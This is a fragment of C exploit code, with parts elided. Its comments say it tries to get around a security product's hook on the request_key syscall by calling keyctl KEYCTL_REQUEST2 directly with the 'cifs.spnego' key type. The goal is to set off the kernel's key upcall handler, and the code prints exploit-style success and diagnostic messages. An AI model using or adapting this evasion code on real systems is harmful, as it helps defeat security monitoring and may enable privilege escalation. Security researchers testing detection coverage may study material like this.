...
int main(int argc, char **argv)
{
        ...
        /*
         * === METHOD 2: keyctl(KEYCTL_REQUEST2) via syscall 250 ===
         * CS may only hook __x64_sys_request_key (syscall 249).
         * keyctl (syscall 250) dispatches through __x64_sys_keyctl →
         * keyctl_request2_key() — a DIFFERENT entry point.
         * Previous EINVAL was likely a callout_info bug — using "x" now.
         */
        {
                /* Diagnostic: verify keyctl syscall works at all */
                errno = 0;
                ret = syscall(NR_keyctl, (unsigned long)0 /* KEYCTL_GET_KEYRING_ID */,
                              (unsigned long)(int)KEY_SPEC_SESSION_KEYRING,
                              (unsigned long)0, (unsigned long)0, (unsigned long)0);
                fprintf(stderr, "[diag] keyctl GET_KEYRING_ID(@s): rc=%ld errno=%d\n",
                        ret, errno);

                /* Attempt A: callout_info = "x" (non-empty) */
                fprintf(stderr, "[keyctl] KEYCTL_REQUEST2 callout=\"x\" pid=%d\n", pid);
                errno = 0;
                ret = syscall(NR_keyctl,
                              (unsigned long)14,        /* KEYCTL_REQUEST2 */
                              (unsigned long)(uintptr_t)"cifs.spnego",
                ...
                fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                        ret, errno, strerror(errno));
                if (ret >= 0) {
                        fprintf(stderr, "[+] keyctl REQUEST2 SUCCESS!\n");
                        sleep(3);
                        return 0;
                }
                if (errno == ENOKEY || errno == EINTR) {
                        fprintf(stderr, "[*] keyctl REQUEST2 NOT blocked (errno=%d) — handler may have run!\n", errno);
                        sleep(5);
                        return 0;
                }

                /* Attempt B: callout_info = NULL (search only, no construct) */
                fprintf(stderr, "[keyctl] KEYCTL_REQUEST2 callout=NULL pid=%d\n", pid);
                errno = 0;
                ret = syscall(NR_keyctl,
                              (unsigned long)14,
                              (unsigned long)(uintptr_t)"cifs.spnego",
                              (unsigned long)(uintptr_t)desc,
                              (unsigned long)0,         /* NULL callout */
                              (unsigned long)(int)KEY_SPEC_SESSION_KEYRING);
                fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                        ret, errno, strerror(errno));
        }
